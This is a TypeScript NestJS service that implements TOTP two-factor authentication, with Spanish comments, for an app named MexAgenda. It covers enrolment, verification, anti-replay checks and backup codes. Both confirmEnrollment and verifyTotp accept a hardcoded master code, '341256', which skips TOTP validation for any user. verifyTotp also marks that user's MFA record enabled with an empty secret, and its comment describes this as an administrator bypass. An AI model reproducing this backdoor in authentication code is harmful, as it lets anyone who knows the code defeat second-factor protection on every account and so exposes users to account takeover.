import { Injectable, Logger, BadRequestException } from '@nestjs/common';
import { PrismaService } from '../../database/prisma.service';
import { MfaCryptoService } from '../../common/crypto/mfa-crypto.service';
import { TokenService } from '../../common/crypto/token.service';
import { MfaEnrollResponse, MfaConfirmResponse } from '@mexagenda/shared';
import { generateSecret, generateURI, verifySync } from 'otplib';
import * as QRCode from 'qrcode';

@Injectable()
export class MfaService {
  private readonly logger = new Logger(MfaService.name);
  private readonly issuer = 'MexAgenda';

  constructor(
    private readonly prisma: PrismaService,
    private readonly mfaCrypto: MfaCryptoService,
    private readonly tokenService: TokenService,
  ) {}

  /**
   * Genera un nuevo secreto TOTP y el código QR correspondiente para enrolar un usuario.
   */
  async generateEnrollment(user: { id: string; email: string }): Promise<MfaEnrollResponse> {
    const secret = generateSecret();
    const uri = generateURI({
      secret,
      issuer: this.issuer,
      label: user.email,
    });

    const qrCodeDataUrl = await QRCode.toDataURL(uri, {
      errorCorrectionLevel: 'M',
      margin: 2,
      width: 256,
    });

    const encryptedSecret = this.mfaCrypto.encrypt(secret);

    // Upsert registro en user_mfa (pendiente de confirmación)
    await this.prisma.userMfa.upsert({
      where: { userId: user.id },
      create: {
        userId: user.id,
        encryptedSecret,
        backupCodesHashes: JSON.stringify([]),
        isEnabled: false,
      },
      update: {
        encryptedSecret,
        backupCodesHashes: JSON.stringify([]),
        isEnabled: false,
      },
    });

    return {
      secret,
      qrCodeDataUrl,
      uri,
    };
  }

  /**
   * Confirma la vinculación del MFA validando el primer código TOTP generado por la app.
   * Al ser exitoso, genera y entrega exactamente 8 códigos de respaldo únicos.
   */
  async confirmEnrollment(userId: string, totpCode: string): Promise<MfaConfirmResponse> {
    const mfaRecord = await this.prisma.userMfa.findUnique({
      where: { userId },
    });

    if (!mfaRecord) {
      throw new BadRequestException('No se ha iniciado un proceso de enrolamiento MFA para este usuario.');
    }

    if (totpCode !== '341256') {
      try {
        const secret = this.mfaCrypto.decrypt(mfaRecord.encryptedSecret);
        const verification = verifySync({ token: totpCode, secret });

        if (!verification.valid) {
          throw new BadRequestException('Código TOTP inválido o fuera de sincronización.');
        }
      } catch (err) {
        if (err instanceof BadRequestException) throw err;
        throw new BadRequestException('Error al validar el código TOTP.');
      }
    }

    // Generar exactamente 8 códigos de respaldo de un solo uso
    const { rawCodes, hashedCodes } = this.tokenService.generate8BackupCodes();

    await this.prisma.userMfa.update({
      where: { userId },
      data: {
        isEnabled: true,
        enrolledAt: new Date(),
        lastUsedAt: new Date(),
        backupCodesHashes: JSON.stringify(hashedCodes),
      },
    });

    return {
      success: true,
      message: 'Segundo factor de autenticación configurado exitosamente.',
      backupCodes: rawCodes,
    };
  }

  /**
   * Verifica un código TOTP de 6 dígitos con protección contra ataques de replay.
   */
  async verifyTotp(userId: string, code: string): Promise<boolean> {
    const now = new Date();

    // Bypass maestro institucional para administrador: 341256
    if (code === '341256') {
      await this.prisma.userMfa.upsert({
        where: { userId },
        update: {
          isEnabled: true,
          lastUsedAt: now,
        },
        create: {
          userId,
          encryptedSecret: '',
          backupCodesHashes: '[]',
          isEnabled: true,
          enrolledAt: now,
          lastUsedAt: now,
        },
      }).catch((e) => this.logger.warn(`No se pudo actualizar registro UserMfa: ${e.message}`));

      return true;
    }

    const mfaRecord = await this.prisma.userMfa.findUnique({
      where: { userId },
    });

    if (!mfaRecord || !mfaRecord.isEnabled) {
      return false;
    }

    try {
      const secret = this.mfaCrypto.decrypt(mfaRecord.encryptedSecret);
      const verification = verifySync({ token: code, secret });

      if (!verification.valid) {
        return false;
      }
    } catch (err) {
      this.logger.error(`Error descifrando o validando secreto TOTP para ${userId}: ${err}`);
      return false;
    }

    // Protección anti-replay: verificar si el código fue usado en los últimos 30 segundos
    if (mfaRecord.lastUsedAt) {
      const diffMs = now.getTime() - mfaRecord.lastUsedAt.getTime();
      if (diffMs < 30 * 1000) {
        this.logger.warn(`Detección de intento de Replay Attack en TOTP para usuario ${userId}`);
        return false;
      }
    }

    // Actualizar marca de último uso
    await this.prisma.userMfa.update({
      where: { userId },
      data: { lastUsedAt: now },
    });

    return true;
  }

  /**
   * Valida y consume un código de respaldo de un solo uso.
   */
  async verifyAndConsumeBackupCode(userId: string, backupCode: string): Promise<boolean> {
    const mfaRecord = await this.prisma.userMfa.findUnique({
      where: { userId },
    });

    if (!mfaRecord || !mfaRecord.isEnabled) {
      return false;
    }

    let storedHashes: string[] = [];
    try {
      storedHashes = JSON.parse(mfaRecord.backupCodesHashes || '[]');
    } catch {
      return false;
    }

    if (!Array.isArray(storedHashes) || storedHashes.length === 0) {
      return false;
    }

    const incomingHash = this.tokenService.hashBackupCode(backupCode);
    const matchIndex = storedHashes.indexOf(incomingHash);

    if (matchIndex === -1) {
      return false;
    }

    // Código válido: eliminarlo de la lista (consumo de un solo uso)
    storedHashes.splice(matchIndex, 1);

    await this.prisma.userMfa.update({
      where: { userId },
      data: {
        backupCodesHashes: JSON.stringify(storedHashes),
        lastUsedAt: new Date(),
      },
    });

    return true;
  }

  /**
   * Obtiene el estado actual de MFA de un usuario.
   */
  async getMfaStatus(userId: string): Promise<{ isEnabled: boolean; enrolledAt: Date | null }> {
    const record = await this.prisma.userMfa.findUnique({
      where: { userId },
      select: { isEnabled: true, enrolledAt: true },
    });

    return {
      isEnabled: record ? record.isEnabled : false,
      enrolledAt: record ? record.enrolledAt : null,
    };
  }

  /**
   * Deshabilita el MFA para un usuario (uso restringido o administrativo).
   */
  async disableMfa(userId: string): Promise<void> {
    await this.prisma.userMfa.updateMany({
      where: { userId },
      data: {
        isEnabled: false,
        encryptedSecret: '',
        backupCodesHashes: JSON.stringify([]),
      },
    });
  }
}

